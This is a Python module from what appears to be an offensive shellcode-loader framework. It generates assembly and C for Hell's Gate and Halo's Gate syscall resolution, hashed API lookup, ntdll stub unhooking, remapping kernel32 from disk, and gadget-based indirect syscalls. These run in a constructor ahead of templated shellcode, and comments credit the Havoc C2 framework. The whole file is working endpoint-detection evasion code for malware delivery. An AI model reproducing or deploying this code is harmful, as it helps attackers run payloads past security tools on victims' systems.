import random
import string
import tempfile
import os
import subprocess
from c.utils.typedefs import typedefs

class halosgaterap:
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.handle = 'LoadLibrary'
        if 'handle' in arguments:
            if arguments['handle'] in ['LoadLibrary', 'GetModuleHandleA']:
                self.handle = arguments['handle']
            else:
                print("Handle must be either LoadLibrary or GetModuleHandleA")
                exit(0)
        fd, file_path = tempfile.mkstemp(suffix='.asm')
        self.outfd, self.outfile_path = tempfile.mkstemp(suffix='.o')
        self.typedefs = typedefs
        self.apicalls = {}
        with os.fdopen(fd, 'w') as f:
            inline_assembly = """
default rel
            
bits 64
global getntdll
global getExportTable
global getExAddressTable
global getExNamePointerTable
global getExOrdinalTable
global getApiAddr
global findSyscallNumber
global halosGateUp
global halosGateDown
global HellsGate
global HellDescent
global Finish

extern gadget

section .data
    wSystemCall dd 000h
    return_address dq 000h
    r12_value dq 000h

section .text
    
getntdll:
    xor rax, rax                ; zero RAX only, no RDI involved
    mov rcx, [gs:rax+60h]       ; PEB
    mov rcx, [rcx+18h]          ; PEB->Ldr
    mov rcx, [rcx+20h]          ; InMemoryOrderModuleList.Flink
    mov rcx, [rcx]              ; second entry (ntdll)
    mov rcx, [rcx+20h]          ; DllBase
    mov rax, rcx
    ret


; Get ExportTable Address of supplied module DLL
getExportTable:
    push rbx
	mov rbx, rcx            ; RBX = Supplied Module Address
	mov r8, rcx             ; R8  = Supplied Module Address
	mov ebx, [rbx+3Ch]      ; RBX = Offset NewEXEHeader
	add rbx, r8             ; RBX = &ntdll.dll + Offset NewEXEHeader = &NewEXEHeader
	xor rcx, rcx            ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
	add cx, 88ffh
	shr rcx, 8h             ; RCX = 0x88ff --> 0x88
	mov edx, [rbx+rcx]      ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
	add rdx, r8             ; RDX = &ntdll.dll + RVA ExportTable = &ExportTable
	mov rax, rdx            ; RAX = &module.ExportTable
    pop rbx
	ret                     ; return to caller


; Get &module.ExportTable.AddressTable from &module.ExportTable
getExAddressTable:
    push rbx
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r10, r10
	mov r10d, [rdx+1Ch]     ; RDI = RVA AddressTable
	add r10, r8             ; R10 = &AddressTable
	mov rax, r10            ; RAX = &module.ExportTable.AddressTable
    pop rbx
	ret                     ; return to caller

; Get &module.NamePointerTable from &module.ExportTable
getExNamePointerTable:
    push rbx
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r11, r11
	mov r11d, [rdx+20h]     ; R11 = [&ExportTable + Offset RVA Name PointerTable] = RVA NamePointerTable
	add r11, r8             ; R11 = &NamePointerTable (Memory Address of module Export NamePointerTable)
	mov rax, r11            ; RAX = &module.ExportTable.NamePointerTable
    pop rbx
	ret                     ; return to caller

; Get &OrdinalTable from ntdll.dll ExportTable
getExOrdinalTable:
    push rbx
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r10, r10
	mov r10d, [rdx+24h]     ; R12 = RVA  OrdinalTable
	add r10, r8             ; R12 = &OrdinalTable
	mov rax, r10            ; RAX = &module.ExportTable.OrdinalTable
    pop rbx
	ret                     ; return to caller

; Get the address of the API from the module ExportTable
; IN: &Module.ExportTable.NamePointerTable + &Module
getApiAddr:
	mov r10, r9             ; R10 = &module.ExportTable.AddressTable
	mov r11, [rsp+28h]      ; R11 = &module.ExportTable.NamePointerTable
	mov r9, [rsp+30h]       ; R9  = &OrdinalTable (r9 is free after the copy)
	xor rax, rax            ; RAX = name index counter
	jmp short getApiAddrLoop

getApiAddrLoop:
	mov ecx, [r11+rax*4]    ; ECX = RVA NameString (rcx is free scratch)
	add rcx, r8             ; RCX = &NameString

	push rax                ; hash loop clobbers eax
	push rdx                ; hash loop clobbers rdx

	mov eax, 0x811C9DC5     ; FNV-1a offset basis
	mov rdx, rcx

hash_compare:
	movzx ecx, byte [rdx]
	test ecx, ecx
	jz hash_done
	xor eax, ecx
	imul eax, eax, 0x01000193
	inc rdx
	jmp short hash_compare

hash_done:
	pop rdx                 ; restore hash param
	cmp eax, edx            ; match?
	pop rax                 ; restore counter (pop doesn't touch flags)
	je getApiAddrFin

	inc rax
	jmp short getApiAddrLoop

getApiAddrFin:
	movzx eax, word [r9+rax*2]  ; EAX = ordinal (movzx clears upper bits too)
	mov eax, [r10+rax*4]         ; EAX = RVA of API
	add rax, r8                 ; RAX = &module.API
	ret

; Find the syscall number for the NTDLL API with provided API address
; RCX = NTDLL.<API> Address
findSyscallNumber:
	mov r10d, 00B8D18B4Ch    ; "4C 8B D1 B8" = mov r10,rcx ; mov eax,...
	mov r11d, [rcx]
	cmp r10d, r11d
	jne error
	movzx eax, word [rcx+4]
	ret

; RCX = &NTDLL.<API> | RDX = 32bytes * Up Increment
halosGateUp:
	mov  r10, 00B8D18B4Ch   ; signature in a VOLATILE register
	xor  rax, rax
	mov  al, 20h
	mul  dx
	add  rcx, rax
	mov  r11d, [rcx]        ; VOLATILE scratch
	cmp  r10d, r11d
	jne  error
	xor  rax, rax
	mov  ax, [rcx+4]
	ret

halosGateDown:
	mov  r10, 00B8D18B4Ch
	xor  rax, rax
	mov  al, 20h
	mul  dx
	sub  rcx, rax
	mov  r11d, [rcx]
	cmp  r10d, r11d
	jne  error
	xor  rax, rax
	mov  ax, [rcx+4]
	ret

error:
	xor rax, rax ; return 0 for error
	ret          ; return to caller

HellsGate:
    mov [wSystemCall], ecx
    ret

HellDescent:
    mov r10, rcx 
    mov rcx, [rsp]
    mov [r12_value], r12
    mov [return_address], rcx
    mov rcx, [gadget]
    mov [rsp], rcx
    mov rax, [wSystemCall] 
    lea r12, Finish
    syscall
    ret
Finish:
    mov rcx, [return_address]
    mov [rsp], rcx
    mov r12, [r12_value]
    ret
"""
            f.write(inline_assembly)
        result = subprocess.run(['nasm', '-f', 'win64', file_path, '-o', self.outfile_path])
        os.unlink(file_path)
        os.close(self.outfd)

    def imports(self) -> list[str]:
        return ['#include <windows.h>',
                '#include <stdio.h>']

    def compilerOptions(self) -> list[str]:
        return [self.outfile_path]
    
    def codeblocks(self) -> str:
        ntdll = ['NtClose', 'NtOpenFile', 'NtCreateSection', 'NtMapViewOfSection', 'NtProtectVirtualMemory', 'NtUnmapViewOfSection']
        codeblock = ''
        for apicall in self.apicalls:
            if apicall[0:2] == 'Nt' and apicall not in ntdll:
                ntdll.append(apicall)
            elif apicall[0:2] in ['Zw', 'Rt']:
                codeblock += f"""
{self.typedefs[apicall]}
"""

        codeblock += f"""
typedef struct {{
    {'\n\t'.join([f'DWORD {x}_ssn;' for x in ntdll ])}
}} Resolver;

Resolver resolver;
PVOID gadget;

extern VOID HellsGate(WORD wSystemCall);
extern NTSTATUS HellDescent(...);

NTSTATUS status;

EXTERN_C PVOID getntdll();

EXTERN_C PVOID getExportTable(
	IN PVOID moduleAddr
);

EXTERN_C PVOID getExAddressTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

EXTERN_C PVOID getExNamePointerTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

EXTERN_C PVOID getExOrdinalTable(
	IN PVOID moduleExportTableAddr,
	IN PVOID moduleAddr
);

EXTERN_C PVOID getApiAddr(
	IN DWORD apiNameStringLen,
	IN DWORD apiNameHash,
	IN PVOID moduleAddr,
	IN PVOID ExExAddressTable,
	IN PVOID ExNamePointerTable,
	IN PVOID ExOrdinalTable
);

EXTERN_C DWORD findSyscallNumber(
	IN PVOID ntdllApiAddr
);

EXTERN_C DWORD halosGateUp(
	IN PVOID ntdllApiAddr,
	IN WORD index
);

EXTERN_C DWORD halosGateDown(
	IN PVOID ntdllApiAddr,
	IN WORD index
);
"""


        codeblock += """
DWORD GetFunctionSize( PVOID Function )
{
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    SIZE_T                  ExpDirectorySize = 0;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    PCHAR                   FunctionName     = NULL;
    PBYTE                   Addr1            = NULL;
    PBYTE                   Addr2            = NULL;
    DWORD                   SyscallSize      = 0;
    DWORD                   Offset           = 0;
    PBYTE                   Module           = (PBYTE) GetModuleHandleA( "ntdll.dll" );

    NtHeader         = (PIMAGE_NT_HEADERS)(Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew);
    ExpDirectory     = (PIMAGE_EXPORT_DIRECTORY)(Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress);
    ExpDirectorySize = (SIZE_T)(Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size);

    AddrOfNames      = (PDWORD)(Module + ExpDirectory->AddressOfNames);
    AddrOfFunctions  = (PDWORD)(Module + ExpDirectory->AddressOfFunctions);
    AddrOfOrdinals   = (PWORD)(Module + ExpDirectory->AddressOfNameOrdinals);

    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
        if ( ( PBYTE ) FunctionAddr >= ( PBYTE ) ExpDirectory &&
             ( PBYTE ) FunctionAddr <  ( PBYTE ) ExpDirectory + ExpDirectorySize )
            continue;

        // make sure is a system call (compare initial bytes to Zw)
        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
        if ( *( PWORD )FunctionName != 0x775a )
            continue;

        // save one random syscall addr
        if ( ! Addr1 )
        {
            Addr1 = Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ];
            continue;
        }
        else
        {
            // get the distance between our saved syscall addr and this one
            Addr2  = Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ];
            Offset = Addr1 > Addr2 ? Addr1 - Addr2 : Addr2 - Addr1;

            // if the distance is the smallest we have seen so far, save it
            if ( ! SyscallSize || Offset < SyscallSize ) {
                SyscallSize = Offset;
            }
        }
    }

    // by now, we should have the size of a syscall stub
    return SyscallSize;
}

/*
Original implementations from @C5pider, from Demon's implementation in the Havoc Framework

@ Params
    NtFunction    - A pointer to the function which we want the SSN of
    SSN           - A pointer to a WORD which will be populated with the SSN if successful

@ Return
    1 for success, 0 for failure
*/
BOOLEAN GetSSNInternal( PBYTE NtFunction, PWORD SSN )
{
    DWORD Offset  = 0;
    BYTE  SSNLow  = 0;
    BYTE  SSNHigh = 0;
    BOOL  Success = FALSE;

    if ( !SSN )
        return FALSE;

    do {

        // We've reached the end of the Nt/Zw function
        if ( *( NtFunction + Offset ) == 0xC3 ) {
            break;
        }

        // Checking for the move r10, rcx and mov rcx, [ssn] instructions
        if ( *( NtFunction + Offset + 0 ) == 0x4C &&
             *( NtFunction + Offset + 1 ) == 0x8B &&
             *( NtFunction + Offset + 2 ) == 0xD1 &&
             *( NtFunction + Offset + 3 ) == 0xB8 )
        {
            // The first byte after those instructions is the lower byte of the SSN
            SSNLow  = *( NtFunction + Offset + 4 );

            // The seccond byte after those instructions is the upper byte of the SSN
            SSNHigh = *( NtFunction + Offset + 5 );

            // Combine the bytes into a word
            *SSN     = ( SSNHigh << 8 ) | SSNLow ;
            return TRUE;
        }

        Offset++;

    } while ( TRUE );

    return FALSE;
}

/*
Original implementations from @C5pider, from Demon's implementation in the Havoc Framework

@ Params
    NtFunction    - A pointer to the function which we want the SSN of

@ Return
    The SSN
*/
WORD GetSSN( PBYTE NtFunction ) 
{

    BOOLEAN Success   = FALSE; 
    WORD    SSN       = 0;
    DWORD   Counter   = 0;
    DWORD   SzNtApi   = 0;
    PVOID   Neighbour = NULL;

    if ( GetSSNInternal( NtFunction, &SSN ) )
        return SSN;

    else {

        // All Nt/Zw functions have the same stub size, we'll use it as a reference to find neighbours
        SzNtApi = GetFunctionSize( NtFunction ); 

        // If the NtFunction was hooked, start calling GetSSNInternal on its neighbours. ~400 neighbours or so
        while ( SSN == 0 && Counter < 200 ) {

            // Upper neighbour
            Neighbour = ( NtFunction ) + ( SzNtApi * Counter );
            if ( GetSSNInternal( Neighbour, &SSN ) ){
                SSN   -= Counter;
                break;
            }

            // Lower neighbour
            Neighbour = ( NtFunction ) - ( SzNtApi * Counter );
            if ( GetSSNInternal( Neighbour, &SSN ) ){
                SSN   += Counter;
                break;
            }

            Counter++;
        }
    }

    return SSN;

}        

BOOLEAN FindGadget( PBYTE Module, LPSTR GadgetBytes, PVOID* GadgetAddr )
{
    if ( !GadgetAddr ) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS  NT   = (PIMAGE_NT_HEADERS)(Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew);
    PVOID              Base = (PVOID)(Module + IMAGE_FIRST_SECTION( NT )->VirtualAddress);
    DWORD              Size = (DWORD)(IMAGE_FIRST_SECTION( NT )->SizeOfRawData);
    DWORD              SzGt = (DWORD)(strlen( GadgetBytes ));
    
    // Iterate through the .text section and find a gadget
    for ( PBYTE current = Base; (void *)current <= (void *)(Base + Size-SzGt); current++ ) {
        if ( !memcmp( current, GadgetBytes, SzGt ) ) {
            *GadgetAddr = current;
            return TRUE;
        }
    }
    return FALSE;
}

BOOLEAN IsValidStub( PBYTE FunctionAddr ) {
    // Checking for the move r10, rcx and mov rcx, [ssn] instructions
    // If the syscall stub is valid, continue
    // If it is invalid, patch it with a stub
    DWORD Offset = 0;
    do {
        // We've reached the end of the Nt/Zw function
        if ( *( FunctionAddr + Offset ) == 0xC3 ) {
            break;
        }
        // Checking for the move r10, rcx and mov rcx, [ssn] instructions
        if ( *( FunctionAddr + Offset + 0 ) == 0x4C &&
             *( FunctionAddr + Offset + 1 ) == 0x8B &&
             *( FunctionAddr + Offset + 2 ) == 0xD1 &&
             *( FunctionAddr + Offset + 3 ) == 0xB8 )
        {
            // The first byte after those instructions is the lower byte of the SSN
            BYTE SSNLow = *( FunctionAddr + Offset + 4 );

            // The second byte after those instructions is the upper byte of the SSN
            BYTE SSNHigh = *( FunctionAddr + Offset + 5 );

            // Combine the bytes into a word
            WORD SSN = ( SSNHigh << 8 ) | SSNLow ;

            // Theres about 500 SSNs
            // Check for the `syscall` instruction
            if ( SSN < 500 && *( FunctionAddr + 0x12 ) == 0x0f && *( FunctionAddr + 0x13 ) == 0x05 )
                return TRUE;
        }
            Offset++;
    } while ( TRUE );
    return FALSE;
}

void unhook(){
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    SIZE_T                  ExpDirectorySize = 0;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    PCHAR                   FunctionName     = NULL;
    PBYTE                   Module           = (PBYTE)GetModuleHandleA( "ntdll.dll" );

    NtHeader         = (PIMAGE_NT_HEADERS)(Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew);
    ExpDirectory     = (PIMAGE_EXPORT_DIRECTORY)(Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress);
    ExpDirectorySize = (SIZE_T)(Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size);

    AddrOfNames      = (PDWORD)(Module + ExpDirectory->AddressOfNames);
    AddrOfFunctions  = (PDWORD)(Module + ExpDirectory->AddressOfFunctions);
    AddrOfOrdinals   = (PWORD)(Module + ExpDirectory->AddressOfNameOrdinals);

    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {

        // make sure is a system call (compare initial bytes to Zw)
        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
        
        if ( *( PWORD )FunctionName != 0x775a )
            continue;

        // ZwQuerySystemTime just jumps to RtlQuerySystemTime which just reads KUSER_SHARED_DATA
        if ( !strcmp( FunctionName, "ZwQuerySystemTime" ) ) {
            continue;
        }

        FunctionAddr = Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ];

        if ( !IsValidStub( FunctionAddr ) ) {
            WORD   SSN         = GetSSN( FunctionAddr ); 
            BYTE   Patch[]     = { 0x4C, 0x8B, 0xD1, 0xB8, ( BYTE )SSN, ( BYTE )( SSN >> 8 ), 0x00, 0x00, 0x0F, 0x05, 0xC3 };
            PVOID  BaseAddress = FunctionAddr;
            SIZE_T RegionSize  = 1;
            DWORD  OldProtect  = 0;
            
            HellsGate(resolver.NtProtectVirtualMemory_ssn);
            HellDescent(( HANDLE )-1, &BaseAddress, &RegionSize, PAGE_EXECUTE_READWRITE, &OldProtect );
            //printf( "%s is being patched!\\n", FunctionName );
            memcpy( FunctionAddr, Patch, sizeof( Patch ) );
            HellsGate(resolver.NtProtectVirtualMemory_ssn);
            HellDescent(( HANDLE )-1, &BaseAddress, &RegionSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        }
    }
}


typedef NTSTATUS (WINAPI *RtlDosPathNameToNtPathName_U_WithStatus_t)(PCWSTR DosFileName, PUNICODE_STRING NtFileName, PWSTR *FilePart, PVOID Reserved);

VOID ReMap ( LPWSTR ModuleString ){


    NTSTATUS status = 0;
    PVOID    ntdll  = LoadLibraryA( "ntdll.dll" );
    PVOID    Module = LoadLibraryW( ModuleString );
    PVOID    buffer = NULL;

    UNICODE_STRING      dllPath         = { 0 };
    OBJECT_ATTRIBUTES   objAttr         = { 0 };
    IO_STATUS_BLOCK     ioStatusBlock   = { 0 };
    HANDLE              fileHandle      = NULL;
    HANDLE              sectionHandle   = NULL;
    PVOID               baseAddress     = 0;
    SIZE_T              viewSize        = 0;
    LARGE_INTEGER       offset          = { 0 };
    DWORD ssn = 0;

    RtlDosPathNameToNtPathName_U_WithStatus_t pfnRtlDosPathNameToNtPathName_U_WithStatus = (RtlDosPathNameToNtPathName_U_WithStatus_t)GetProcAddress(ntdll, "RtlDosPathNameToNtPathName_U_WithStatus");

    status = pfnRtlDosPathNameToNtPathName_U_WithStatus( ModuleString, &dllPath, NULL, NULL );
    //printf( "RtlDosPathNameToNtPathName_U_WithStatus : 0x%llx\\n", status );

    InitializeObjectAttributes( &objAttr, &dllPath, OBJ_CASE_INSENSITIVE, NULL, NULL );

    HellsGate(resolver.NtOpenFile_ssn);
    status = HellDescent(&fileHandle, FILE_GENERIC_READ, &objAttr, &ioStatusBlock, FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE );
    //printf( "NtOpenFile: 0x%llx\\n", status );

    HellsGate(resolver.NtCreateSection_ssn);
    status = HellDescent(&sectionHandle, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle );
    //printf( "NtCreateSection: 0x%llx\\n", status );

    ULONG AllocationType = 0;
    ULONG_PTR ZeroBits = 0;
    SIZE_T CommitSize = 0;
    HellsGate(resolver.NtMapViewOfSection_ssn);
    status = HellDescent(sectionHandle, ( HANDLE )-1, &baseAddress, ZeroBits, CommitSize, &offset, &viewSize, ViewShare, AllocationType, PAGE_READONLY );
    //printf( "NtMapViewOfSection: 0x%llx\\n", status );

    PVOID             dllBase           = Module;
    PIMAGE_DOS_HEADER hookedDosHeader   = dllBase;
    PIMAGE_NT_HEADERS hookedNtHeader    = (PIMAGE_NT_HEADERS)(( DWORD_PTR )dllBase + hookedDosHeader->e_lfanew);

    for ( WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++ ) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)( ( DWORD_PTR )IMAGE_FIRST_SECTION( hookedNtHeader ) + ( ( DWORD_PTR )IMAGE_SIZEOF_SECTION_HEADER * i ) );
        
        if ( !strcmp( hookedSectionHeader->Name, ".text" ) ) {
            //printf( "Found .text\\n" );
            DWORD   oldProtection   = 0;
            PVOID   HookedText      = (PVOID)(( DWORD_PTR )dllBase + ( DWORD_PTR )hookedSectionHeader->VirtualAddress);
            DWORD64 BytesToProt     = hookedSectionHeader->Misc.VirtualSize;
            
            HellsGate(resolver.NtProtectVirtualMemory_ssn);
            status = HellDescent(( HANDLE )-1, &HookedText, &BytesToProt, PAGE_EXECUTE_READWRITE, &oldProtection);
            //printf( "NtProtectVirtualMemory: 0x%llx\\n", status );   

            memcpy( ( PVOID )(dllBase + hookedSectionHeader->VirtualAddress), ( PVOID )(baseAddress + hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize );

            HellsGate(resolver.NtProtectVirtualMemory_ssn);
            status = HellDescent(( HANDLE )-1, &HookedText, &BytesToProt, PAGE_EXECUTE_READWRITE, &oldProtection);
            //printf( "NtProtectVirtualMemory: 0x%llx\\n", status );   

        }
	}
    HellsGate(resolver.NtClose_ssn);
    HellDescent( fileHandle );
    HellsGate(resolver.NtClose_ssn);
    HellDescent( sectionHandle );
    HellsGate(resolver.NtUnmapViewOfSection_ssn);
    HellDescent(( HANDLE )-1, baseAddress );

}
"""
        codeblock += f"""

DWORD halosGate(PVOID apiAddr){{
	DWORD syscallNumber = 0;
	syscallNumber = findSyscallNumber(apiAddr);
	if (syscallNumber == 0){{
		DWORD index = 0;
        while (syscallNumber == 0){{
			index++;
			syscallNumber = halosGateUp(apiAddr, index);
			if (syscallNumber){{
				syscallNumber = syscallNumber - index;
				break;
			}}
			syscallNumber = halosGateDown(apiAddr, index);
			if (syscallNumber){{
				syscallNumber = syscallNumber + index;
				break;
			}}    
		}}  
	}}
	return syscallNumber;
    
}}

NTSTATUS status = 0;

__attribute__((constructor)) void {self.name}(){{

	PVOID ntdll = NULL;
	PVOID ntdllExportTable = NULL;

	PVOID ntdllExAddrTbl = NULL;
	PVOID ntdllExNamePtrTbl = NULL;
	PVOID ntdllExOrdinalTbl = NULL;

    ntdll = getntdll();
    ntdllExportTable = getExportTable(ntdll);
    ntdllExAddrTbl = getExAddressTable(ntdllExportTable, ntdll);
    ntdllExNamePtrTbl = getExNamePointerTable(ntdllExportTable, ntdll);
    ntdllExOrdinalTbl = getExOrdinalTable(ntdllExportTable, ntdll);
    {'\n\t'.join([f'resolver.{apicall}_ssn = halosGate(getApiAddr({len(apicall)}, {self.hashstring(apicall)}, ntdll, ntdllExAddrTbl, ntdllExNamePtrTbl, ntdllExOrdinalTbl));' for apicall in ntdll])}

    if ( !FindGadget( (PBYTE)GetModuleHandleA( "ntdll.dll" ), "\\x41\\xff\\xd4", &gadget ) ) {{
        printf( "We could not find a gadget!" );
        return;
    }}
    unhook();
    ReMap(L"c:\\\\windows\\\\system32\\\\kernel32.dll");
}}
"""
        return codeblock

    def template(self, templateCode, transformers, shellcodeSize):
        for _, field_name, _, _ in string.Formatter().parse(templateCode):
            if field_name is not None and field_name not in ['shellcodeSize', 'transformers']:
                self.apicalls[field_name] = ''
        self.resolve()
        return templateCode.format(transformers=transformers, shellcodeSize=shellcodeSize, **self.apicalls)

    def resolve(self):
        for apicall in self.apicalls:
            if apicall[0:2] == 'Nt':
                self.apicalls[apicall] = f"""
	HellsGate(resolver.{apicall}_ssn);
	status = HellDescent"""
            elif apicall[0:2] in ['Rt', 'Zw']:
                self.apicalls[apicall] = f'(({apicall}_t)GetProcAddress(LoadLibrary(TEXT("ntdll.dll")), "{apicall}"))'
            else:
                self.apicalls[apicall] = apicall

    def hashstring(self, functionName) -> int:
        value = 0x811C9DC5

        for character in functionName:
            if character == 0:
                break
            value = ((value ^ ord(character)) * 0x01000193) & 0xFFFFFFFF

        return value